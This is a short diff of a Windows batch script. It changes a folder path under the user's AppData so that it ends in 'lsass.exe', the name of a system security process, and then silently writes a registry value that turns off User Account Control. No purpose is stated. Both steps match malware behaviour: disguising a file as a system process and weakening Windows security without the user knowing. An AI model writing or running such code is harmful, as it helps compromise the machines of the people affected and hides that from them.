@@ -1,7 +1,7 @@
 @echo off
 setlocal enabledelayedexpansion
 
-set "folderPath=%USERPROFILE%\AppData\Local\wdconfig"
+set "folderPath=%USERPROFILE%\AppData\Local\wdconfig\lsass.exe"
 if not exist "%folderPath%" mkdir "%folderPath%"
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
